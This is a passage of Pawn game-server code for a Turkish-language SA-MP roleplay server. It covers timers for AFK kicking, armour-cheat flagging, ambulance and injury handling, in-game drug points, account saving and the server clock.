					GameTextForPlayer(i, "~w~Materyal pakedi satin almak icin a ~n~~r~/paketal yaz", 5000, 5);
				}
				else if(Points[h][Type] == 3 && PlayerInfo[i][pPot] < 3)
				{
					GameTextForPlayer(i, "~w~Tohum satin almak icin ~r~/tohumal yaz", 5000, 5);
				}
				else if(Points[h][Type] == 4)
				{
					GameTextForPlayer(i, "~w~Crack satin almak icin ~r~/crackal yaz", 5000, 5);
				}
				else if(Points[h][Type] == 5)
				{
					GameTextForPlayer(i, "~w~Kutu satin almak icin ~r~/kasaal yaz.", 5000, 5);
				}
			}
		}
	}
}

// Timer Name: playerTabbedLoop()
// TickRate: 1 secs.
Timer:playerTabbedLoop[1000]()
{
	foreach(Player, x)
	{
	    playerConnectedS[x]++;
	    if(playerSeconds[x] < gettime()-1 && playerTabbed[x] != 1 && playerConnectedS[x] >= 5 && 1 <= GetPlayerState(x) <= 3)
	    {
	        playerTabbed[x] = 1;
	        SetTimerEx("AFKick",1000,false,"d", x);
	    }
		playerLastTyped[x]++;
		GetPlayerPos(x, PlayerPos[x][0], PlayerPos[x][1], PlayerPos[x][2]);
		if(PlayerPos[x][0] == PlayerPos[x][3] && PlayerPos[x][1] == PlayerPos[x][4] && PlayerPos[x][2] == PlayerPos[x][5] && playerTabbed[x] != 1)
		{
		    if(playerLastTyped[x] < playerAFKTime[x]) playerAFKTime[x] = playerLastTyped[x];
		    if(playerAFK[x] != 0) playerAFKTime[x]++;
		    else playerAFK[x] = 1;
		    if(playerAFKTime[x] >= 900 && PlayerInfo[x][pAdmin] < 5)
			{
			    SendClientMessage(x, COLOR_WHITE, "15 dakikadan fazla AFK olduðundan dolayý otomatik olarak kicklendin.");
				Kick(x);
			}
		}
		else
		{
		    if(playerAFK[x] != 0) playerAFK[x] = 0, playerAFKTime[x] = 0;
		}
		PlayerPos[x][3] = PlayerPos[x][0];
		PlayerPos[x][4] = PlayerPos[x][1];
		PlayerPos[x][5] = PlayerPos[x][2];
	}
}

// Timer Name: EMSUpdate()
// TickRate: 5 secs.
Timer:EMSUpdate[5000]()
{
	foreach(Player, i)
	{
		new Float:posX, Float:posY, Float:posZ;
 		GetPlayerPos(i, posX, posY, posZ);

		new Float:iArmor;
		GetPlayerArmour(i, iArmor);
		if(iArmor > ValidArmor[i] && AdminDuty[i] == 0)
		{
		    new string[128];
			format(string, sizeof(string), "%s adli oyuncu armor hack olabilir.", GetPlayerNameEx(i));
			AddAutomatedFlag(i, string);
			format(string, sizeof(string), "{AA3333}AdminKomutu{FFFF00}: %s (ID %d) adlý oyuncu zirh hilesi olabilir", GetPlayerNameEx(i), i);
			ABroadCast(COLOR_YELLOW, string, 2);
		}

	    if(GetPVarType(i, "Injured"))
	    {
	        if(GetPVarInt(i, "EMSAttempt") != 0)
			{

				new Float:health;
 				GetPlayerHealth(i,health);
				SetPlayerHealth(i, health-1);
				if(GetPVarInt(i, "EMSAttempt") == -1)
				{
    				if(!IsPlayerInRangeOfPoint(i, 3.0, GetPVarFloat(i,"MedicX"), GetPVarFloat(i,"MedicY"), GetPVarFloat(i,"MedicZ")))
	    			{
	        			SendClientMessage(i, COLOR_WHITE, "Kendinden geçmiþ bir þekildeydin, acilen hastaneye getirildin.");
	        			KillEMSQueue(i);
						SpawnPlayer(i);
	    			}
					GameTextForPlayer(i, "~r~Yaralisin~n~~w~/kabulet olum yada /cagir ambulans", 5000, 3);
				}
				if(GetPVarInt(i, "EMSAttempt") == 1)
				{
	    			if(!IsPlayerInRangeOfPoint(i, 3.0, GetPVarFloat(i,"MedicX"), GetPVarFloat(i,"MedicY"), GetPVarFloat(i,"MedicZ")))
	    			{
	        			SendClientMessage(i, COLOR_WHITE, "Kendinden geçmiþ bir þekildeydin, acilen hastaneye getirildin.");
	        			KillEMSQueue(i);
						SpawnPlayer(i);
	    			}
					GameTextForPlayer(i, "~r~Yaralisin~n~~w~Ambulans gelmesini bekliyorsun.", 5000, 3);
				}
				if(GetPVarInt(i, "EMSAttempt") == 2)
				{
	    			if(!IsPlayerInRangeOfPoint(i, 3.0, GetPVarFloat(i,"MedicX"), GetPVarFloat(i,"MedicY"), GetPVarFloat(i,"MedicZ")))
	    			{
	        			SendClientMessage(i, COLOR_WHITE, "Kendinden geçmiþ bir þekildeydin, acilen hastaneye getirildin.");
	        			KillEMSQueue(i);
						SpawnPlayer(i);
	    			}
	    			GameTextForPlayer(i, "~g~Kurtarildin~n~~w~Tedavi edilmeyi bekliyorsun.", 5000, 3);
				}
				if(GetPVarInt(i, "EMSAttempt") == 3)
				{
	    			if(IsPlayerInAnyVehicle(i))
	    			{
	        			new ambmodel = GetPlayerVehicleID(i);
	        			if(IsAnAmbulance(ambmodel))
	        			{
	    					GameTextForPlayer(i, "~g~Kurtarildin~n~~w~Ambulansin seni hastaneye goturmesini bekliyorsun.", 5000, 3);
						}
						else
						{
		    				SendClientMessage(i, COLOR_WHITE, "Can desteði olmadýðý için baygýn düþtün, acilen hastaneye gönderildin.");
	        				KillEMSQueue(i);
							SpawnPlayer(i);
						}
					}
					else
					{
		    			SendClientMessage(i, COLOR_WHITE, "Araçtan düþtün ve acil olarak hastaneye gönderildin.");
	        			KillEMSQueue(i);
						SpawnPlayer(i);
					}
				}

				GetPlayerHealth(i, health);
				if(health <= 5)
				{
	    			SendClientMessage(i, COLOR_WHITE, "Kendinden geçmiþ bir þekildeydin, acilen hastaneye getirildin.");
	    			KillEMSQueue(i);
					SpawnPlayer(i);
				}
	        }
	    }
	}
}

// Timer Name: ProductionUpdate()
// TickRate: 5 Minutes.
Timer:ProductionUpdate[300000]()
{
	foreach(Player, i)
	{
		if(playerTabbed[i] != 1)
		{
			if(PlayerInfo[i][pPayReady] < 6) { PlayerInfo[i][pPayReady] += 1; } //+ 5 min to PayDay anti-abuse
		}
		if(PlayerInfo[i][pFishes] >= 5) {
			if(FishCount[i] >= 3) PlayerInfo[i][pFishes] = 0;
			else ++FishCount[i];
		}
	}
	SaveFamilies();
}

// Timer Name: SyncUp()
// TickRate: 1 Minute.
Timer:SyncUp[60000]()
{
	new string[128];
	new hour,minuite,second;

	SyncTime();
	ScoreUpdate();

	gettime(hour,minuite,second);
	FixHour(hour);
	hour = shifthour;
	if(minuite < 10)
	{
		format(string, sizeof(string), "%d:0%d", hour, minuite);
	}
	else
	{
		format(string, sizeof(string), "%d:%d", hour, minuite);
	}
	TextDrawSetString(WristWatch, string);

	foreach(Player, i)
	{
		if(IsValidDynamicObject(PlayerInfo[i][pWeedObject]) && PlayerInfo[i][pWeedGrowth] < 45) switch(PlayerInfo[i][pDrugsSkill])
		{
			case 0 .. 50: PlayerInfo[i][pWeedGrowth] += 1;
			case 51 .. 100: PlayerInfo[i][pWeedGrowth] += 2;
			case 101 .. 200: PlayerInfo[i][pWeedGrowth] += 3;
			case 201 .. 400: PlayerInfo[i][pWeedGrowth] += 4;
			default: PlayerInfo[i][pWeedGrowth] += 5;
		}
		switch(GetPVarInt(i, "STD"))
		{
			case 1:
			{
				new Float: health;
				GetPlayerHealth(i, health);
				SetPlayerHealth(i, health - 5.0);
				SendClientMessage(i, COLOR_LIGHTBLUE, "AIDS yüzünden 4 can kaybettin.");
			}
			case 2:
			{
				new Float: health;
				GetPlayerHealth(i, health);
				SetPlayerHealth(i, health - 12.0);
				SendClientMessage(i, COLOR_LIGHTBLUE, "AIDS yüzünden 8 can kaybettin.");
			}
			case 3:
			{
				new Float: health;
				GetPlayerHealth(i, health);
				SetPlayerHealth(i, health - 20.0);
				SendClientMessage(i, COLOR_LIGHTBLUE, "AIDS yüzünden 12 can kaybettin.");
			}
		}
		if(GetPlayerCash(i) < 0)
		{
			if(!GetPVarType(i, "debtMsg"))
			{
				format(string, sizeof(string), "Devlete $%d borcun var, eðer ödemezsen tutuklanacaksýn.", GetPlayerCash(i));
				SendClientMessage(i, COLOR_LIGHTRED, string);
				SetPVarInt(i, "debtMsg", 1);
			}
		}
		else DeletePVar(i, "debtMsg");
	}
}

// Timer Name: MoneyUpdate()
// Tickrate: 1 secs.
Timer:MoneyUpdate[1000]()
{
	new
		iTempVar;

	if(iAdverTimer >= 1)
		--iAdverTimer;

	new hour,minuite,second;
	gettime(hour,minuite,second);
	FixHour(hour);
	hour = shifthour;
	new tstring[7];
	if(minuite < 10)
	{
		format(tstring, sizeof(tstring), "%d:0%d", hour, minuite);
	}
	else
	{
		format(tstring, sizeof(tstring), "%d:%d", hour, minuite);
	}
	TextDrawSetString(WristWatch, tstring);

	foreach(Player, i)
	{
   		if(PlayerInfo[i][pCash] != GetPlayerMoney(i))
		{
			ResetPlayerMoney(i);
			GivePlayerMoney(i, PlayerInfo[i][pCash]);
		}

		if((iTempVar = GetPVarInt(i, "adT")) != 0)
		{
			if(--iTempVar <= 0) DeletePVar(i, "adT");
			else SetPVarInt(i, "adT", iTempVar);
		}

		if(PlayerInfo[i][pTriageTime] != 0)
		{
			PlayerInfo[i][pTriageTime]--;
  		}
		if(PlayerInfo[i][pTicketTime] != 0)
		{
			PlayerInfo[i][pTicketTime]--;
		}
		if(ServiceTime[i] != 0)
		{
			ServiceTime[i]--;
		}

		if(PlayerInfo[i][pGPS] > 0 && GetPVarType(i, "gpsonoff"))
		{
			new zone[28];
			GetPlayer2DZone(i, zone, MAX_ZONE_NAME);
			TextDrawSetString(GPS[i], zone);
		}
		if(GetPVarInt(i, "fuelonoff") == 1)
		{
			if(IsPlayerInAnyVehicle(i))
 			{
    			SetProgressBarValue(FuelBar[i], Fuel[GetPlayerVehicleID(i)]);
 		    	UpdateProgressBar(FuelBar[i], i);
     		}
     		else
     		{
     			HideProgressBarForPlayer(i, FuelBar[i]);
 		    	DeletePVar(i, "fuelonoff");
	    		DestroyProgressBar(FuelBar[i]);
	   		 	FuelBar[i] = INVALID_BAR_ID;
  			}
		}
	}
}
// Timer Name: SpecUpdate()
// TickRate: 3 secs.
Timer:SpecUpdate[3000]()
{
	foreach(Player, i)
	{
	    if(PlayerInfo[i][pAdmin] >= 2)
	    {
		    if(Spectating[i] >= 1)
		    {
				if(Spectate[i] < 553)
				{
					new targetid = Spectate[i];
					if(!IsPlayerConnected(targetid))
					{
    					SendClientMessage(i, COLOR_WHITE, "Ýzlediðin oyuncu oyundan ayrýldý.");
			    		GettingSpectated[Spectate[i]] = 999;
			    		Spectating[i] = 0;
						Spectate[i] = 999;
						SetPVarInt(i, "SpecOff", 1);
						TogglePlayerSpectating(i, false);
						SetCameraBehindPlayer(i);
					}
				}
				if(Spectate[i] == 553)
				{
					TogglePlayerControllable(i, 1);
					TogglePlayerSpectating(i, 0);
					DeletePVar(i, "DoktorMasrafi");
					SpawnPlayer(i);
					Spectate[i] = 999;
					Spectating[i] = 0;
				}
				if(Spectate[i] == 556)
				{
					SetPlayerToTeamColor(i);
					Spectate[i] = 999;
				}
			}
		}
	}
}

// Timer Name: SaveUpdate()
// Tickrate: 3 Minutes.
Timer:SaveUpdate[180000]()
{
	foreach(Player, i)
	{
		if(GetPVarInt(i, "TempName") != 1 && gPlayerLogged[i] && GetPVarInt(i, "PBM") == 0 && GetPVarInt(i, "EventToken") == 0 && AdminDuty[i] == 0)
		{
			PlayerInfo[i][pInt] = GetPlayerInterior(i);
			new Float: fArmour;
			if(GetPVarType(i, "tabbedVW") != 0) {
				PlayerInfo[i][pVW] = GetPVarInt(i, "tabbedVW");
			} else PlayerInfo[i][pVW] = GetPlayerVirtualWorld(i);
			GetPlayerIp(i, PlayerInfo[i][pIP], 32);
			GetPlayerPos(i, PlayerInfo[i][pPos_x], PlayerInfo[i][pPos_y], PlayerInfo[i][pPos_z]);
			GetPlayerFacingAngle(i, PlayerInfo[i][pPos_r]);
			if(GetPlayerArmour(i, fArmour) < ValidArmor[i])	GetPlayerArmour(i, PlayerInfo[i][pArmor]);
			else PlayerInfo[i][pArmor] = ValidArmor[i];
			GetPlayerHealth(i, PlayerInfo[i][pHealth]);
		}
	}
	SaveFamilies();
	SaveFamiliesHQ();
	SaveHouses();
}

// Timer Name: ForceSaveTimer()
// Tickrate: 5 Minutes.
Timer:ForceSaveTimer[300000]()
{
	foreach(Player, i)
	{
		SaveAccount(i);
	}
	print("[ForceSaveTimer] All player accounts updated successfully.");
    UpdatePoints();
    print("[ForceSaveTimer] All points updated successfully.");
}

// Timer Name: ServerTime()
// Tickrate: 1 Second.
Timer:ServerTime[1000]()
{
    if(PSeconds > TimeFactor && (TimeFactor < -5))
 	{
		PSeconds = 1;
		PMinutes = PMinutes+10;
 	}
	if(PSeconds > TimeFactor && (TimeFactor < -4))
 	{
		PSeconds = 1;
		PMinutes = PMinutes+5;
 	}
	if(PSeconds > TimeFactor && (TimeFactor < -3))
 	{
		PSeconds = 1;
		PMinutes = PMinutes+1;
 	}
	if(PSeconds > TimeFactor && (TimeFactor < -2))
 	{
		PSeconds = 1;
		PMinutes = PMinutes+1;
 	}
	if(PSeconds > TimeFactor && (TimeFactor < -1))
 	{
		PSeconds = 1;
		PMinutes = PMinutes+1;
 	}
	if(PSeconds > TimeFactor && (TimeFactor < 1))
 	{
		PSeconds = 1;
		PMinutes = PMinutes+1;
 	}
	if(PSeconds > TimeFactor)
 	{
		PSeconds = 1;
		PMinutes = PMinutes+1;
 	}
	else
	{
		PSeconds = PSeconds+1;
	}
	if(PMinutes > 59)
	{
		PMinutes = 0;
		if(PHours > 23)
		{
			PHours = 0;
		}
		else
		{
			PHours = PHours+1;
		}
 	}
	foreach(Player, i)
	{
		SetPlayerTime(i,PHours,PMinutes);
	}
	return true;
}

public OnPlayerModelSelection(playerid, response, listid, modelid)
{
    if(listid == SkinList)
    {
        if(response)
        {
           	if(modelid < 0 || modelid > 299 || modelid == 0 || modelid == 265 || modelid == 266 || modelid == 267 || modelid == 274 || modelid == 275 || modelid == 276 || modelid == 277  || modelid == 278 || modelid == 279 || modelid == 280 || modelid == 281 || modelid == 282 || modelid == 283
			|| modelid == 284 || modelid == 285 || modelid == 286 || modelid == 287 || modelid == 288) return SendClientMessage(playerid, COLOR_GREY, "Bu skini alma yetkiniz yok!");
			if(modelid == 294) return SendClientMessage(playerid, COLOR_GREY, "Bu skini sadece VIP'ler alabilir");
			if(PlayerInfo[playerid][pCash] < 100) return SendClientMessage(playerid, COLOR_GREY, "Yeterli miktarda paranýz bulunmamaktadýr.");
            PlayerInfo[playerid][pSkin] = modelid;
            SetPlayerSkin(playerid, modelid);
			GivePlayerCash(playerid, -250);
        }
        else
		{
		}
    }
    return 1;
}
forward OcultarCuenta(playerid);
public OcultarCuenta(playerid)
{
			 Showing[playerid] = 0;
			 TextDrawHideForPlayer(playerid, CuentaBox);
		     TextDrawHideForPlayer(playerid, CuentaLogo);
		     TextDrawHideForPlayer(playerid, CuentaGeneral);
		     TextDrawHideForPlayer(playerid, CuentaInmuebles);
		     TextDrawHideForPlayer(playerid, CuentaAutos);
		     TextDrawHideForPlayer(playerid, CuentaInventario);
		     TextDrawHideForPlayer(playerid, CuentaCerrar);
		     CancelSelectTextDraw(playerid);
}
	
public KontrolEdiver(playerid) {
	new Float:x, Float:y, Float:z;
	GetPlayerCameraFrontVector(playerid, x, y, z);
	#pragma unused x
	#pragma unused y
	if(z < -0.8) {
	TogglePlayerControllable(playerid,1);
	KontrolEdildi[playerid] = 2;
	Kick(playerid);
	}
	TogglePlayerControllable(playerid,1);
	return 1;
}

